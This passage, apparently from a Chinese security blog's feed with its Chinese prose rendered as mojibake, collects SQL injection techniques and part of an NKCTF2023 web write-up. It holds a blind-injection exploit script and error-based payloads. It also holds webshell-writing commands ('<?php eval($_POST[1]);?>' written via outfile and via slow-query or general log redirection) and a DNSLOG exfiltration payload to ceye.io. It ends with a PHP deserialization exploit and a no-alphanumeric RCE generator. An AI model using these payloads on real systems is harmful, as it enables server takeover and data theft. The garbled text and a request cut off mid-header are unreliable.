number">33</span><span class="token punctuation">,</span><span class="token number">127</span><span class="token punctuation">)</span><span class="token punctuation">:</span>     <span class="token comment" spellcheck="true">#print chr(j)</span>        n <span class="token operator">+=</span> <span class="token number">1</span>        payload <span class="token operator">=</span> username<span class="token punctuation">.</span>format<span class="token punctuation">(</span><span class="token punctuation">(</span>flag<span class="token operator">+</span>chr<span class="token punctuation">(</span>j<span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token string">'hex'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>       <span class="token comment" spellcheck="true">#print payload</span>        <span class="token keyword">if</span> <span class="token string">'admin'</span> <span class="token operator">not</span> <span class="token keyword">in</span> sqli<span class="token punctuation">(</span>payload<span class="token punctuation">)</span><span class="token punctuation">:</span>            flag <span class="token operator">=</span> flag <span class="token operator">+</span> chr<span class="token punctuation">(</span>j<span class="token number">-1</span><span class="token punctuation">)</span>            <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>            <span class="token keyword">continue</span>    <span class="token keyword">if</span> n <span class="token operator">==</span> <span class="token number">94</span><span class="token punctuation">:</span>        <span class="token keyword">print</span><span class="token punctuation">(</span><span class="token string">'find is over'</span><span class="token punctuation">)</span>        <span class="token keyword">print</span><span class="token punctuation">(</span>flag<span class="token punctuation">)</span>        <span class="token keyword">break</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åŸºäºdempa0fitå¸ˆå‚…ç»™å‡ºçš„expå°æ”¹äº†ä¸€ä¸‹ï¼Œæ€»æ„Ÿè§‰åŸç‰ˆå†™çš„æœ‰ç‚¹é—®é¢˜ã€‚å½“ç„¶æˆ‘æ˜¯ç”¨è®°äº‹æœ¬å†™çš„ï¼Œå› æ­¤ä¹Ÿä¸ä¸€å®šå¯¹ã€‚ã€‚</p><p>åç»­è¿˜å¯ä»¥ç»“åˆorder byè¿›è¡Œç›²æ³¨æˆ–è€…æŠ¥é”™æ³¨å…¥ï¼Œä½†æˆ‘æ„Ÿè§‰ç”¨å¤„ä¸å¤§ï¼Œå› ä¸ºæ—¢ç„¶èƒ½ç”¨ç›²æ³¨ï¼Œé‚£ä¸ºä»€ä¹ˆä¸ç›´æ¥ç”¨ç›²æ³¨å‘¢ï¼Ÿå¸Œæœ›çœ‹åˆ°çš„å¸ˆå‚…èƒ½ç»™æˆ‘è§£ç­”ã€‚</p><h4 id="å±€é™çš„æŠ¥é”™æ³¨å…¥"><a href="#å±€é™çš„æŠ¥é”™æ³¨å…¥" class="headerlink" title="å±€é™çš„æŠ¥é”™æ³¨å…¥"></a>å±€é™çš„æŠ¥é”™æ³¨å…¥</h4><blockquote><p>å‚è€ƒ<a href="https://blog.sari3l.com/posts/9622f295/#/%E6%8A%A5%E9%94%99%E5%9E%8B">sari3l</a>å¸ˆå‚…çš„åšå®¢ï¼Œé€ŸæŸ¥è¡¨ä¹Ÿæ˜¯å‡ºè‡ªsari3lå¸ˆå‚…ã€‚å¯¹ä¸€äº›å‡½æ•°è¿›è¡Œäº†è§£æã€‚</p></blockquote><h5 id="uuid"><a href="#uuid" class="headerlink" title="uuid"></a>uuid</h5><p>ç‰ˆæœ¬ï¼šmysql8.0</p><p>MySQL 8.0 æ¨å‡ºäº†å‡½æ•° UUID_TO_BINï¼Œå› ä¸ºUUIDç”Ÿæˆçš„å­—ç¬¦ä¸²å¤ªå¤§ï¼ŒUUID_TO_BINå°±æ˜¯æŠŠUUIDå­—ç¬¦ä¸²è½¬æ¢æˆ16è¿›åˆ¶ï¼Œç”¨æ¥ç²¾ç®€å­˜å‚¨ç©ºé—´ã€‚</p><p>æ­£å¸¸æ ¼å¼æ˜¯ä¸ºï¼šSELECT UUID_TO_BIN(UUID());</p><p>å¦‚æœä¸æ˜¯UUID()ç”Ÿæˆçš„å­—ç¬¦ä¸²ï¼Œå‡½æ•°ä¼šæŠ¥é”™ã€‚</p><p>payloadï¼šSELECT UUID_TO_BIN(database());</p><h5 id="exp"><a href="#exp" class="headerlink" title="exp"></a>exp</h5><p>ç‰ˆæœ¬ï¼šmysql 5.5</p><p>exp()ä¸ºä¼šè¿”å›eçš„xæ¬¡æ–¹ç»“æœï¼Œå¦‚æœè¿”å›ç»“æœè¶…è¿‡doubleç±»å‹çš„èŒƒå›´ï¼Œå°†ä¼šæŠ¥é”™ã€‚</p><p>payloadä¸ºï¼šselect exp(~(select * from(select database())a))</p><h5 id="Bigint"><a href="#Bigint" class="headerlink" title="Bigint"></a>Bigint</h5><p>ç‰ˆæœ¬ï¼šmysql 5.5</p><p>å’ŒexpåŸç†ä¸€æ ·ï¼Œè¿ç®—ç»“æœè¶…è¿‡èŒƒå›´æ—¶ï¼Œå°†ä¼šæŠ¥é”™ã€‚</p><p>~0ä¸ºå–åä»è€Œå¾—åˆ°èŒƒå›´å†…çš„æœ€å¤§å€¼ï¼Œå› æ­¤select ~0+1å°±ä¼šè¶Šç•Œå¯¼è‡´æŠ¥é”™ã€‚å› æ­¤æ„é€ å‡º1å°±å¯ä»¥äº†ï¼Œè¿™é‡Œç”¨åˆ°éè¿ç®—!ï¼Œ!åé¢è·Ÿä¸Šå­—ç¬¦ä¸²è¿”å›1ã€‚</p><p>å› æ­¤payloadä¸ºï¼šselect ~0+!(select * from (select user())x);</p><p>â€‹  select !(select * from(select user())x)-~0</p><h5 id="é€ŸæŸ¥è¡¨"><a href="#é€ŸæŸ¥è¡¨" class="headerlink" title="é€ŸæŸ¥è¡¨"></a>é€ŸæŸ¥è¡¨</h5><table><thead><tr><th>ç±»åˆ«</th><th>å‡½æ•°</th><th>ç‰ˆæœ¬éœ€æ±‚</th><th>5.5.x</th><th>5.6.x</th><th>5.7.x</th><th>8.x</th><th>å‡½æ•°æ˜¾é”™é•¿åº¦</th><th>MysqlæŠ¥é”™å†…å®¹é•¿åº¦</th><th>é¢å¤–é™åˆ¶</th></tr></thead><tbody><tr><td>ä¸»é”®é‡å¤</td><td>floor round</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td>64</td><td></td><td>data_type â‰  varchar</td></tr><tr><td>åˆ—åé‡å¤</td><td>name_const</td><td>â“</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only version()</td></tr><tr><td>åˆ—åé‡å¤</td><td>join</td><td>[5.5.49, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td>only columns</td></tr><tr><td>æ•°æ®æº¢å‡º - Double</td><td>1e308 cot exp pow</td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>æ•°æ®æº¢å‡º - BIGINT</td><td>Bigint</td><td>[5.5.5, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>MYSQL_ERRMSG_SIZE</td><td></td></tr><tr><td>å‡ ä½•å¯¹è±¡</td><td>geometrycollection linestring multipoint multipolygon multilinestring polygon</td><td>[?, 5.5.48]</td><td>âœ”ï¸</td><td></td><td></td><td></td><td></td><td>244</td><td></td></tr><tr><td>ç©ºé—´å‡½æ•° Geohash</td><td>ST_LatFromGeoHash ST_LongFromGeoHash ST_PointFromGeoHash</td><td>[5.7, ?)</td><td></td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>GTID</td><td>gtid_subset gtid_subtract</td><td>[5.6.5, ?)</td><td></td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>200</td><td></td><td></td></tr><tr><td>JSON</td><td>json_*</td><td>[5.7.8, 5.7.11]</td><td></td><td></td><td>âœ”ï¸</td><td></td><td>200</td><td></td><td></td></tr><tr><td>UUID</td><td>uuid_to_bin bin_to_uuid</td><td>[8.0, ?)</td><td></td><td></td><td></td><td>âœ”ï¸</td><td>128</td><td></td><td></td></tr><tr><td>XPath</td><td>extractvalue updatexml</td><td>[5.1.5, ?)</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td>âœ”ï¸</td><td></td><td></td><td></td></tr></tbody></table><h4 id="è¯»æœåŠ¡å™¨æ–‡ä»¶"><a href="#è¯»æœåŠ¡å™¨æ–‡ä»¶" class="headerlink" title="è¯»æœåŠ¡å™¨æ–‡ä»¶"></a>è¯»æœåŠ¡å™¨æ–‡ä»¶</h4><p>mysqlæä¾›äº†ç”¨äºè¯»å–æ–‡ä»¶çš„å‡½æ•°ï¼ˆ<strong>ä»¥ä¸‹ä¸¤ç§æ–¹æ³•å‡å—åˆ°secure-file-privçš„é™åˆ¶</strong>ï¼‰ï¼š</p><p>select load_file(file_path);        #è¯»æ–‡ä»¶ï¼Œå›æ˜¾</p><p>load data infile file_path into table test FIELDS TERMINATED BY â€˜\nâ€™; #æŒ‰ç…§\n(æ¢è¡Œ)åˆ†å‰²è¯»å–æŒ‡å®šçš„file_pathæœåŠ¡ç«¯æ–‡ä»¶çš„æ•°æ®å¹¶æ’å…¥åˆ°testè¡¨ä¸­ã€‚</p><h4 id="ä¼ªé€ mysqlæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶"><a href="#ä¼ªé€ mysqlæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶" class="headerlink" title="ä¼ªé€ mysqlæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶"></a>ä¼ªé€ mysqlæœåŠ¡ç«¯è¯»å®¢æˆ·ç«¯æ–‡ä»¶</h4><p>load data infile file_path into table test FIELDS TERMINATED BY â€˜\nâ€™;æ˜¯è¯»å–å®¢æˆ·ç«¯æ–‡ä»¶å¹¶æŠŠæ•°æ®æ’å…¥åˆ°testè¡¨ä¸­ï¼Œè¯»å–å®¢æˆ·ç«¯æ–‡ä»¶çš„å‰ææ˜¯local_infileè¿™ä¸ªå˜é‡æ˜¯Onï¼Œé€šè¿‡æŸ¥é˜…å®˜æ–¹æ–‡æ¡£å¯çŸ¥åœ¨Mysql8ä¹‹ålocal_infileè¿™ä¸ªå˜é‡é»˜è®¤ä¸ºOFFï¼Œæˆ‘è‡ªæµ‹Mysql5.6çš„ç¯å¢ƒlocal_infileé»˜è®¤æ˜¯Onã€‚</p><p>æˆ‘åœ¨æœ¬æœºDç›˜å‡†å¤‡äº†Program.txtï¼ŒæˆåŠŸæŠŠæ•°æ®å†™å…¥äº†flagè¡¨ã€‚</p><pre class="line-numbers language-mysql"><code class="language-mysql">load data local infile "D://Program.txt" into table flag FIELDS TERMINATED BY '\n'> Affected rows: 3> æ—¶é—´: 0.034s<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å®é™…ä¸Šè¯»å®¢æˆ·ç«¯æŒ‡å®šè·¯å¾„çš„æ–‡ä»¶è¿™ä¸ªæ“ä½œæ˜¯æœåŠ¡ç«¯æ¥æŒ‡æ˜çš„ã€‚å‡è®¾å®¢æˆ·ç«¯å‘ä¼ªé€ çš„mysqlæœåŠ¡å™¨å‘é€ä¸€ä¸ªæŸ¥è¯¢çš„è¯·æ±‚ï¼ŒæœåŠ¡ç«¯é€šè¿‡ä¼ªé€ è¯·æ±‚å°±å¯ä»¥ä»»æ„è¯»å–å®¢æˆ·ç«¯çš„æ–‡ä»¶ï¼š</p><ol><li>å®¢æˆ·ç«¯ï¼šæˆ‘è¦flagè¡¨ä¸­çš„æ•°æ®</li><li>æœåŠ¡ç«¯ï¼šæˆ‘è¦ä½ çš„&#x2F;etc&#x2F;passwdå†…å®¹</li><li>å®¢æˆ·ç«¯ï¼šç»™ä½ &#x2F;etc&#x2F;passwdçš„å†…å®¹</li></ol><p>ç”±äºéœ€è¦ä¼ªé€ mysqlæœåŠ¡å™¨ï¼Œä¸ªäººè®¤ä¸ºåˆ©ç”¨é¢è¾ƒå°ã€‚è¯¥èŠ‚å†…å®¹æ‘˜è‡ª<a href="https://paper.seebug.org/1112/#_3">LoRexxar@çŸ¥é“åˆ›å®‡404å®éªŒå®¤ &amp; Dawu@çŸ¥é“åˆ›å®‡404å®éªŒå®¤</a></p><h4 id="å†™å…¥webshell"><a href="#å†™å…¥webshell" class="headerlink" title="å†™å…¥webshell"></a>å†™å…¥webshell</h4><p>å¸¸è§çš„æœ‰outfile dumpfileå‡½æ•°å†™shell,å‡è®¾ç½‘ç«™ç›®å½•è·¯å¾„ä¸º&#x2F;var&#x2F;www&#x2F;htmlã€‚</p><pre class="line-numbers language-mysql"><code class="language-mysql">union select 1,"<?php @eval($_POST[1]);?>",3 into outfile '/var/www/html/shell.php';union select 2,"<?php @eval($_POST[1]);?>",3 into dumpfile '/var/www/html/shell.php';--mysqlè¯†åˆ«16è¿›åˆ¶ï¼Œå› æ­¤ä¹Ÿå¯ä»¥ç”¨0xç»•è¿‡ä¸€äº›WAFã€‚union select 1,0x223c3f70687020406576616c28245f504f53545b315d293b3f3e22,3 into outfile '/var/www/html/shell.php';<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>é™åˆ¶ï¼š</p><ul><li>secure_file_privæ”¯æŒwebç›®å½•æ–‡ä»¶å¯¼å‡º</li><li>æ•°æ®åº“ç”¨æˆ·fileæƒé™</li><li>ç»å¯¹è·¯å¾„</li></ul><p>ç”±äºå—åˆ°secure-file-privé™åˆ¶ï¼Œå†™shellå¾€å¾€éš¾ä»¥å®ç°ã€‚å› æ­¤å¯ä»¥é€šè¿‡æ—¥å¿—æ–‡ä»¶çš„æ–¹æ³•æ¥ç»•è¿‡ã€‚</p><p>åŸç†ï¼šmysqlå­˜åœ¨æ—¥å¿—ä»¥åŠæ…¢æ—¥å¿—æœºåˆ¶ï¼Œå®ƒè®°å½•äº†ç”¨æˆ·çš„æ“ä½œã€‚ç”±äºgeneral_log(æ—¥å¿—å¼€å…³)é»˜è®¤æ˜¯å…³é—­çš„ï¼Œslow_query_log(æ…¢æ—¥å¿—å¼€å…³)é»˜è®¤æ˜¯å¼€å¯çš„ï¼Œå› æ­¤åœ¨è¿™é‡Œåˆ†ææ…¢æ—¥å¿—ã€‚</p><p>æŸ¥è¯¢ï¼šshow GLOBAL VARIABLES like â€˜%slow_query_log%â€™</p><table><thead><tr><th align="center">å˜é‡å</th><th align="center">å€¼</th></tr></thead><tbody><tr><td align="center">slow_query_log_file</td><td align="center">&#x2F;www&#x2F;server&#x2F;data&#x2F;mysql-slow.log</td></tr><tr><td align="center">slow_query_log</td><td align="center">ON</td></tr></tbody></table><p>å¯ä»¥çœ‹åˆ°slow_query_logæ˜¯é»˜è®¤å¼€å¯æ»´ï¼Œå¹¶ä¸”æ…¢æ—¥å¿—å­˜å‚¨è·¯å¾„ä¸º&#x2F;www&#x2F;server&#x2F;data&#x2F;mysql-slow.logã€‚</p><p>é¡¾åæ€ä¹‰ï¼Œåªæœ‰æ‰§è¡Œæ—¶é—´æ…¢çš„sqlè¯­å¥æ‰è¢«è®°å½•ä¸æ…¢æ—¥å¿—ä¸­ï¼Œå¯ä»¥é€šè¿‡query_timeæŸ¥çœ‹æ—¶é—´é˜ˆå€¼ï¼Œæˆ‘è¿™é‡Œé»˜è®¤æ˜¯3ç§’ï¼Œä¹Ÿå°±æ˜¯è¯´å¤§äº3ç§’æ‰§è¡Œæ—¶é—´çš„è¯­å¥éƒ½ä¼šè®°å½•äºæ…¢æ—¥å¿—ä¸­</p><p>æˆ‘åœ¨æµ‹è¯•ç¯å¢ƒä¸­æ‰§è¡Œï¼šselect â€˜<?php phpinfo();?>â€˜ or sleep(10)ã€‚</p><p>è¿è¡Œæ—¶é—´ä¸º10s&gt;&gt;3sï¼Œå› æ­¤æŸ¥çœ‹mysql-slow.logèƒ½çœ‹åˆ°è¿™æ¬¡è®°å½•ã€‚</p><img src="https://squirt1e.oss-cn-beijing.aliyuncs.com/blog/%E5%BE%AE%E4%BF%A1%E5%9B%BE%E7%89%87_20220708231845.png" style="zoom:50%;" /><p>é‚£ä¹ˆè¿™ä¹Ÿå°±æ„å‘³ç€å¦‚æœæˆ‘ä»¬é€šè¿‡set global slow_query_log_file&#x3D;â€™&#x2F;var&#x2F;www&#x2F;html&#x2F;log.phpâ€™è®¾ç½®æ…¢æ—¥å¿—ä¸ºç½‘ç«™æ ¹ç›®å½•ä¸‹çš„phpæ–‡ä»¶ï¼Œå°±èƒ½å†™å…¥webshelläº†ã€‚å¯ä»¥çœ‹åˆ°æˆ‘åªè¿›è¡Œäº†select â€˜<?php phpinfo();?>â€˜ or sleep(10)æ“ä½œï¼Œå¹¶æœªå†™æ–‡ä»¶ã€‚logæ—¥å¿—ä¹Ÿæ˜¯åŒç†ã€‚</p><p>å› æ­¤payloadï¼š</p><pre class="line-numbers language-mysql"><code class="language-mysql">#æ…¢æ—¥å¿—show global variables like '%slow_query_log%'    #æŸ¥çœ‹è·¯å¾„ï¼Œä»¥åŠæ…¢æ—¥å¿—å¼€å…³set global slow_query_log_file='/var/www/html/shell.php'   #è®¾ç½®è·¯å¾„set global slow_query_log=ON        #è®¾ç½®å¼€å…³select @@long_query_time                 #éå¿…é¡»ï¼Œæœ€å¥½è¿˜æ˜¯å…ˆçœ‹çœ‹select '<?php eval($_POST[1]);?>' or sleep(10)       #å†™å…¥webshell##è®¿é—®shell.php  getshell#logæ—¥å¿—show global variables like '%general_log%'   #æŸ¥çœ‹è·¯å¾„ï¼Œä»¥åŠæ—¥å¿—å¼€å…³mysql> set global general_log_file = '/var/www/html/shell.php'    #è®¾ç½®è·¯å¾„mysql> set global general_log = on         #è®¾ç½®å¼€å…³select '<?php eval($_POST[1]);?>'      #å†™å…¥webshell##è®¿é—®shell.php  getshell<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="DNSLOGå¤–å¸¦"><a href="#DNSLOGå¤–å¸¦" class="headerlink" title="DNSLOGå¤–å¸¦"></a>DNSLOGå¤–å¸¦</h4><p>æ— è®ºæ˜¯é¶åœºè¿˜æ˜¯çœŸå®åœºæ™¯ç»å¸¸ä¼šé‡åˆ°sqlæ³¨å…¥æ— å›æ˜¾ï¼Œå› æ­¤éœ€è¦ç›²æ³¨ã€‚å¦‚æœç›®æ ‡æœåŠ¡å™¨æ˜¯windowsï¼Œå¹¶ä¸”èƒ½å‡ºç½‘ï¼Œè¿™æ—¶å¯ä»¥å°è¯•DNSLOGå¤–å¸¦æ•°æ®ã€‚</p><p><code>payload: load_file(concat(&#39;\\\\&#39;,(select user()),&#39;.????.ceye.io&#39;))</code></p><h2 id="kali-linuxæ¢ç´¢ä¹‹æ¼æ´æ‰«æ"><a href="#kali-linuxæ¢ç´¢ä¹‹æ¼æ´æ‰«æ" class="headerlink" title="kali linuxæ¢ç´¢ä¹‹æ¼æ´æ‰«æ"></a>kali linuxæ¢ç´¢ä¹‹æ¼æ´æ‰«æ</h2><h3 id="Nmap"><a href="#Nmap" class="headerlink" title="Nmap"></a>Nmap</h3><blockquote><p>ç”¨äºæ¢æµ‹å­˜æ´»ä¸»æœºï¼Œæ‰«æä¸»æœºç«¯å£ï¼Œæ¢æµ‹ä¸»æœºæ“ä½œç³»ç»Ÿ</p></blockquote><p>nmap [æ‰«æç±»å‹] [å‚æ•°] ç›®æ ‡IP</p><h4 id="æ‰«æç±»å‹"><a href="#æ‰«æç±»å‹" class="headerlink" title="æ‰«æç±»å‹"></a>æ‰«æç±»å‹</h4><ul><li>-sT         TCPè¿æ¥æ‰«æï¼Œéœ€è¦å»ºç«‹ä¸‰æ¬¡æ¡æ‰‹ï¼Œå› æ­¤ä¼šç•™ä¸‹æ—¥å¿—è®°å½•</li><li>-sS         SYNæ‰«æï¼Œä¸å»ºç«‹ä¸‰æ¬¡æ¡æ‰‹ï¼Œå¾ˆå°‘ä¼šç•™ä¸‹æ—¥å¿—è®°å½•ï¼ˆé»˜è®¤æ˜¯-sS)</li><li>-P0         æ‰«æä¹‹å‰ä¸éœ€è¦Pingï¼Œç”¨äºç»•è¿‡é˜²ç«å‰ç¦PingåŠŸèƒ½</li><li>-sV         æ¢æµ‹æœåŠ¡ç‰ˆæœ¬ä¿¡æ¯ï¼ˆæœåŠ¡æŒ‡çº¹ï¼‰</li><li>-sU         UDPæ‰«æ</li></ul><h4 id="æ‰«æå‚æ•°"><a href="#æ‰«æå‚æ•°" class="headerlink" title="æ‰«æå‚æ•°"></a>æ‰«æå‚æ•°</h4><ul><li>-v   æ˜¾ç¤ºæ‰«æè¿‡ç¨‹</li><li>-p   æŒ‡å®šç«¯å£å·ï¼Œæ¯”å¦‚[1-100],[22,135,1433]</li><li>-A   å…¨é¢ç³»ç»Ÿç›‘æµ‹ï¼Œæ‰«æç³»ç»ŸæŒ‡çº¹</li><li>-T4  é’ˆå¯¹TCPç«¯å£ç¦æ­¢åŠ¨æ€æ‰«æå»¶è¿Ÿè¶…è¿‡10ms</li><li>-iL    æ‰¹é‡æ‰«æï¼Œè¯»å–ä¸»æœºåˆ—è¡¨ï¼Œå¦‚[-iL &#x2F;home&#x2F;ip.txt]</li><li>-oG  å°†æ‰«æç»“æœè¾“å‡ºåˆ°æŸä¸ªæ–‡ä»¶</li><li>â€“script æŒ‡å®šè„šæœ¬æ‰«æ</li></ul><p>ä¸€èˆ¬Nmapä¸fpingè”åŠ¨ï¼ˆfpingå…ˆæ‰«æå­˜æ´»ä¸»æœºï¼‰ï¼š</p><ol><li>fping -a -g 192.168.157.9 192.168.157.200 -q &gt; &#x2F;tmp&#x2F;alive.txt</li><li>Nmap -iL &#x2F;tmp&#x2F;alive.txt</li></ol><h3 id="GOOGLE-HACKè¯­æ³•"><a href="#GOOGLE-HACKè¯­æ³•" class="headerlink" title="GOOGLE HACKè¯­æ³•"></a>GOOGLE HACKè¯­æ³•</h3><ul><li>intitleï¼šæŒ‡å®šæ ‡é¢˜</li><li>inurlï¼šæŒ‡å®šurl</li><li>intextï¼šæŒ‡å®šæ­£æ–‡å†…å®¹</li><li>filetypeï¼šæŒ‡å®šæœç´¢çš„æ–‡æ¡£ç±»å‹</li><li>cacheï¼šæœç´¢ç½‘é¡µå¿«ç…§</li><li>siteï¼šå°†æœç´¢èŒƒå›´é™åˆ¶åœ¨æŸä¸ªç½‘ç«™æˆ–åŸŸåä¸­</li></ul>]]></content>
      
      
      <categories>
          
          <category> æ—¥å¸¸å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> SQLæ³¨å…¥ </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NKCTF2023 WEB</title>
      <link href="/2023/03/27/nkctf2023-web/"/>
      <url>/2023/03/27/nkctf2023-web/</url>
      
        <content type="html"><![CDATA[<h3 id="tl-dr"><a href="#tl-dr" class="headerlink" title="tl;dr"></a>tl;dr</h3><p>ä¸ºä»€ä¹ˆå…¨æ˜¯php</p><h3 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h3><h4 id="baby-php"><a href="#baby-php" class="headerlink" title="baby_php"></a>baby_php</h4><p>exp</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token function">error_reporting</span><span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">class</span> <span class="token class-name">Welcome</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$name</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$arg</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">name</span> <span class="token operator">=</span> <span class="token string">'welcome_to_NKCTF'</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Happy</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$shell</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token variable">$cmd</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">shell</span><span class="token operator">=</span><span class="token string">"system"</span><span class="token punctuation">;</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">cmd</span><span class="token operator">=</span><span class="token string">"more /[e-h][1-z][1-b][e-h]"</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token keyword">class</span> <span class="token class-name">Hell0</span><span class="token punctuation">{</span>    <span class="token keyword">public</span> <span class="token variable">$func</span><span class="token punctuation">;</span>    <span class="token keyword">public</span> <span class="token keyword">function</span> <span class="token function">__construct</span><span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token punctuation">{</span>        <span class="token variable">$this</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">func</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Happy</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>    <span class="token punctuation">}</span><span class="token punctuation">}</span><span class="token variable">$w</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Welcome</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token variable">$w</span><span class="token operator">-</span><span class="token operator">></span><span class="token property">arg</span><span class="token operator">=</span><span class="token keyword">new</span> <span class="token class-name">Hell0</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token keyword">echo</span> <span class="token function">serialize</span><span class="token punctuation">(</span><span class="token variable">$w</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><h4 id="eazy-php"><a href="#eazy-php" class="headerlink" title="eazy_php"></a>eazy_php</h4><ol><li><p>å¼±æ¯”è¾ƒmd5ï¼Œæ²¡è½¬stringï¼Œæ•°ç»„ç»•è¿‡ ?a[]&#x3D;1&amp;b[]&#x3D;2</p></li><li><p>å¼ºè½¬stringå¹¶ä¸”æ˜¯å¼ºæ¯”è¾ƒï¼Œéšä¾¿æœä¸€æœå°±èƒ½æœåˆ°ï¼ˆç”¨burpä¼ </p></li><li><p>e&#x3D;114514.1</p></li><li><p>phpè§£æé”™è¯¯ï¼Œä¼šæŠŠ[è§£ææˆ_å¹¶ä¸”åé¢çš„ç¬¦å·ä¸å¤„ç†ï¼šNS[CTF.go</p></li><li><p>æ— å­—æ¯æ•°å­—RCEï¼Œå–åç»•è¿‡å³å¯</p><pre class="line-numbers language-php"><code class="language-php"><span class="token delimiter">&lt;?php</span><span class="token variable">$ans1</span><span class="token operator">=</span><span class="token string">'system'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å‡½æ•°å</span><span class="token variable">$ans2</span><span class="token operator">=</span><span class="token string">'ls /'</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//å‘½ä»¤</span><span class="token variable">$data1</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$ans1</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°system</span><span class="token variable">$data2</span><span class="token operator">=</span><span class="token punctuation">(</span><span class="token string">'~'</span><span class="token punctuation">.</span><span class="token function">urlencode</span><span class="token punctuation">(</span><span class="token operator">~</span><span class="token variable">$ans2</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment" spellcheck="true">//é€šè¿‡ä¸¤æ¬¡å–åè¿ç®—å¾—åˆ°dir</span><span class="token keyword">echo</span> <span class="token punctuation">(</span><span class="token string">'('</span><span class="token punctuation">.</span><span class="token variable">$data1</span><span class="token punctuation">.</span><span class="token string">')'</span><span class="token punctuation">.</span><span class="token string">'('</span><span class="token punctuation">.</span><span class="token variable">$data2</span><span class="token punctuation">.</span><span class="token string">')'</span><span class="token punctuation">.</span><span class="token string">';'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre></li></ol><p>payload:</p><pre class="line-numbers language-http"><code class="language-http">POST /?a[]=1&amp;b[]=2&amp;e=114514.1&amp;NS[CTF.go=1 HTTP/1.1<span class="token header-name keyword">Host:</span> 0e24c0a9-4d3e-4a99-afc9-001ed884b1f0.node2.yuzhian.com.cn<span class="token header-name keyword">Content-Type:</span> application/x-www-form-urlencoded<span class="token header-name keyword">Content-Length:</span> 